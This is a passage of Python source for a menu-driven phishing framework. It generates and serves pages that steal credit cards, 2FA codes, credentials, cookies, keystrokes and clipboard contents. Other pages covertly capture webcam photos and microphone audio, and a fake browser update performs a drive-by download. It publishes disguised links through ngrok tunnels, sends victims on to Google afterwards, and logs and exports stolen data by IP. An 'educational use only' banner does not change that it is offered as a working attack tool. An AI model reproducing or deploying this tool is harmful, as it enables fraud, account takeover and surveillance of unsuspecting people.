        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_webcam_payload(port)
        with open("webcam.html","w") as f: f.write(html)
        self.start_http_server(port,'webcam',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','verify',port)
        self.print_c(f"\n✅ WEBCAM CAPTURE: {link}", GREEN)

    def generate_microphone(self):
        port=9096
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_microphone_payload(port)
        with open("microphone.html","w") as f: f.write(html)
        self.start_http_server(port,'mic',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','security',port)
        self.print_c(f"\n✅ MICROPHONE RECORDING: {link}", GREEN)

    def generate_fake_captcha(self):
        port=9097
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_fake_captcha_payload(port)
        with open("fake_captcha.html","w") as f: f.write(html)
        self.start_http_server(port,'captcha',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','verify',port)
        self.print_c(f"\n✅ FAKE CAPTCHA: {link}", GREEN)

    def generate_credit_card(self):
        port=9098
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_credit_card_payload(port)
        with open("credit_card.html","w") as f: f.write(html)
        self.start_http_server(port,'credit',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','billing',port)
        self.print_c(f"\n✅ CREDIT CARD STEALER: {link}", GREEN)

    def generate_email_harvest(self):
        port=9099
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_email_harvest_payload(port)
        with open("email_harvest.html","w") as f: f.write(html)
        self.start_http_server(port,'email',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','verify',port)
        self.print_c(f"\n✅ EMAIL HARVESTER: {link}", GREEN)

    def generate_2fa_stealer(self):
        port=9100
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_2fa_payload(port)
        with open("2fa_stealer.html","w") as f: f.write(html)
        self.start_http_server(port,'2fa',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','verify',port)
        self.print_c(f"\n✅ 2FA CODE STEALER: {link}", GREEN)

    def generate_fake_update(self):
        port=9101
        public_choice = input(f"{BLUE}Public link? (1=Yes, 2=No): {RESET}").strip()
        if public_choice=='1' and not self.public_url:
            self.start_public_url(port)
        html=self.generate_fake_update_payload(port)
        with open("fake_update.html","w") as f: f.write(html)
        self.start_http_server(port,'update',redirect_url="https://www.google.com")
        link=self.generate_realistic_link('generic','update',port)
        self.print_c(f"\n✅ FAKE BROWSER UPDATE: {link}", GREEN)

    def view_captured_data(self):
        self.print_c("\n📊 CAPTURED DATA", PINK)
        self.print_c("═"*70, BLUE)
        if not self.captured_data:
            self.print_c("❌ No data captured yet.", RED)
            return
        self.print_c(f"📦 Total captures: {len(self.captured_data)}", GREEN)
        for i,item in enumerate(self.captured_data[-20:],1):
            self.print_c(f"\n[{i}] {item.get('timestamp','Unknown')} - {item.get('type','unknown')}", CYAN)
            self.print_c(f"    IP: {item.get('ip','unknown')}", WHITE)
            data=item.get('data',{})
            if isinstance(data,dict):
                for k,v in data.items():
                    self.print_c(f"    {k}: {v}", WHITE)
            else:
                self.print_c(f"    Data: {str(data)[:200]}...", WHITE)
            self.print_c("─"*40, PINK)
        with open(self.log_file,'w') as f:
            json.dump(self.captured_data,f,indent=2)
        self.print_c(f"\n💾 Saved to {self.log_file}", GREEN)
        choice=input(f"{YELLOW}Export to CSV? (y/n): {RESET}").strip().lower()
        if choice=='y':
            csv_file=self.log_file.replace('.json','.csv')
            with open(csv_file,'w') as f:
                f.write("timestamp,ip,type,data\n")
                for item in self.captured_data:
                    data_str=json.dumps(item['data']).replace(',',';')
                    f.write(f"{item['timestamp']},{item['ip']},{item['type']},\"{data_str}\"\n")
            self.print_c(f"✅ Exported to {csv_file}", GREEN)

    def show_menu(self):
        self.print_c("\n"+"═"*70, PINK)
        self.print_c("📋 MAIN MENU", YELLOW)
        self.print_c("═"*70, PINK)
        menu = [
            ("🎭 PHISHING", [("1","Facebook/Google/Instagram Phishing","Realistic login page")]),
            ("🍪 EXPLOITS", [
                ("2","Cookie Stealer","Steals cookies → redirects to Google"),
                ("3","Keylogger","Records keystrokes"),
                ("4","Geolocation Grabber","GPS + auto open maps"),
                ("5","Browser Fingerprint","Fast device identifiers"),
                ("6","Clipboard Hijacker","Steals copied text"),
            ]),
            ("🆕 NEW MODULES", [
                ("7","Webcam Capture","Takes photo via camera"),
                ("8","Microphone Recording","Records audio"),
                ("9","Fake CAPTCHA","Steals credentials"),
                ("10","Credit Card Stealer","Fake payment page"),
                ("11","Email Harvester","Fake newsletter signup"),
                ("12","2FA Code Stealer","Steals SMS verification codes"),
                ("13","Fake Browser Update","Simulated drive-by download"),
            ]),
            ("🌍 NETWORK", [("14","Generate Public URL (Manual)","Run ngrok/serveo then paste URL")]),
            ("📊 MONITORING", [("15","View Captured Data","See what was stolen"),
                                ("16","Export Data to JSON/CSV","Save captured data")]),
            ("💣 MASS DEPLOY", [("17","Deploy Everything (all ports)","Start all modules at once")]),
        ]
        for category,items in menu:
            self.print_c(f"\n[{category}]", PINK)
            for num,name,desc in items:
                self.print_c(f"  {num}. {name:<30}", GREEN, end='')
                self.print_c(f" - {desc}", WHITE)
        self.print_c(f"\n[0] EXIT", RED)
        self.print_c("\n"+"═"*70, PINK)

    def deploy_everything(self):
        self.print_c("\n💣 DEPLOYING ALL MODULES", RED)
        self.print_c("═"*70, YELLOW)
        # Generate all HTML files
        with open("facebook_login.html","w") as f: f.write(self.generate_phishing_html('facebook'))
        with open("cookie_stealer.html","w") as f: f.write(self.generate_cookie_payload(9090))
        with open("keylogger.html","w") as f: f.write(self.generate_keylogger_payload(9091))
        with open("geolocation.html","w") as f: f.write(self.generate_geolocation_payload(9092))
        with open("fingerprint.html","w") as f: f.write(self.generate_fingerprint_payload(9093))
        with open("clipboard.html","w") as f: f.write(self.generate_clipboard_payload(9094))
        with open("webcam.html","w") as f: f.write(self.generate_webcam_payload(9095))
        with open("microphone.html","w") as f: f.write(self.generate_microphone_payload(9096))
        with open("fake_captcha.html","w") as f: f.write(self.generate_fake_captcha_payload(9097))
        with open("credit_card.html","w") as f: f.write(self.generate_credit_card_payload(9098))
        with open("email_harvest.html","w") as f: f.write(self.generate_email_harvest_payload(9099))
        with open("2fa_stealer.html","w") as f: f.write(self.generate_2fa_payload(9100))
        with open("fake_update.html","w") as f: f.write(self.generate_fake_update_payload(9101))

        # Start all servers
        self.start_http_server(8080,'phish',platform='facebook',redirect_url="https://www.facebook.com")
        self.start_http_server(9090,'cookie',redirect_url="https://www.google.com")
        self.start_http_server(9091,'keylog',redirect_url="https://www.google.com")
        self.start_http_server(9092,'geo',redirect_url="https://www.google.com/maps")
        self.start_http_server(9093,'fingerprint',redirect_url="https://www.whatsmybrowser.org")
        self.start_http_server(9094,'clip',redirect_url="https://www.google.com")
        self.start_http_server(9095,'webcam',redirect_url="https://www.google.com")
        self.start_http_server(9096,'mic',redirect_url="https://www.google.com")
        self.start_http_server(9097,'captcha',redirect_url="https://www.google.com")
        self.start_http_server(9098,'credit',redirect_url="https://www.google.com")
        self.start_http_server(9099,'email',redirect_url="https://www.google.com")
        self.start_http_server(9100,'2fa',redirect_url="https://www.google.com")
        self.start_http_server(9101,'update',redirect_url="https://www.google.com")

        self.print_c(f"\n{'='*70}", PINK)
        self.print_c("🎯 ALL MODULES DEPLOYED! Use separate ngrok tunnels per port or local WiFi.", GREEN)
        self.print_c(f"{'='*70}", PINK)
        self.print_c("\n📱 LINKS (use local IP if no ngrok):", YELLOW)
        self.print_c(f"   Phishing (8080):      http://{self.local_ip}:8080/facebook_login.html", CYAN)
        self.print_c(f"   Cookie (9090):        http://{self.local_ip}:9090/cookie_stealer.html", CYAN)
        self.print_c(f"   Keylogger (9091):     http://{self.local_ip}:9091/keylogger.html", CYAN)
        self.print_c(f"   Geolocation (9092):   http://{self.local_ip}:9092/geolocation.html", CYAN)
        self.print_c(f"   Fingerprint (9093):   http://{self.local_ip}:9093/fingerprint.html", CYAN)
        self.print_c(f"   Clipboard (9094):     http://{self.local_ip}:9094/clipboard.html", CYAN)
        self.print_c(f"   Webcam (9095):        http://{self.local_ip}:9095/webcam.html", CYAN)
        self.print_c(f"   Microphone (9096):    http://{self.local_ip}:9096/microphone.html", CYAN)
        self.print_c(f"   Fake CAPTCHA (9097):  http://{self.local_ip}:9097/fake_captcha.html", CYAN)
        self.print_c(f"   Credit Card (9098):   http://{self.local_ip}:9098/credit_card.html", CYAN)
        self.print_c(f"   Email Harvest (9099): http://{self.local_ip}:9099/email_harvest.html", CYAN)
        self.print_c(f"   2FA Stealer (9100):   http://{self.local_ip}:9100/2fa_stealer.html", CYAN)
        self.print_c(f"   Fake Update (9101):   http://{self.local_ip}:9101/fake_update.html", CYAN)

    def run(self):
        while True:
            self.print_header()
            self.show_menu()
            choice = input(f"{BLUE}➜ Enter your choice: {RESET}").strip()
            if choice == '1':
                self.generate_phishing_link()
            elif choice == '2':
                self.generate_cookie_stealer()
            elif choice == '3':
                self.generate_keylogger()
            elif choice == '4':
                self.generate_geolocation()
            elif choice == '5':
                self.generate_fingerprint()
            elif choice == '6':
                self.generate_clipboard_hijacker()
            elif choice == '7':
                self.generate_webcam()
            elif choice == '8':
                self.generate_microphone()
            elif choice == '9':
                self.generate_fake_captcha()
            elif choice == '10':
                self.generate_credit_card()
            elif choice == '11':
                self.generate_email_harvest()
            elif choice == '12':
                self.generate_2fa_stealer()
            elif choice == '13':
                self.generate_fake_update()
            elif choice == '14':
                self.start_public_url()
            elif choice == '15' or choice == '16':
                self.view_captured_data()
            elif choice == '17':
                self.deploy_everything()
            elif choice == '0':
                self.print_c("\n👋 Exiting...", RED)
                sys.exit(0)
            else:
                self.print_c("❌ Invalid choice!", RED)
            input(f"\n{YELLOW}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    print(RED + """
    ╔══════════════════════════════════════════════════════════════╗
    ║  ⚠️  EDUCATIONAL USE ONLY - TEST ON YOUR OWN DEVICES  ⚠️     ║
    ║                                                              ║
    ║  ✓ Realistic HTTPS links                                    ║
    ║  ✓ Works on ANY WiFi or cellular (with ngrok)              ║
    ║  ✓ After interaction, user is redirected to Google          ║
    ║  ✓ All modules fully functional                             ║
    ║                                                              ║
    ║  By continuing, you confirm this is for educational         ║
    ║  testing on devices you own or have permission to test.    ║
    ╚══════════════════════════════════════════════════════════════╝
    """ + RESET)
    confirm = input("Type 'YES' to continue: ").strip().upper()
    if confirm == 'YES':
        framework = UltimateFramework()
        try:
            framework.run()
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Interrupted. Exiting...{RESET}")
            sys.exit(0)
    else:
        print("Exiting...")
        sys.exit(0)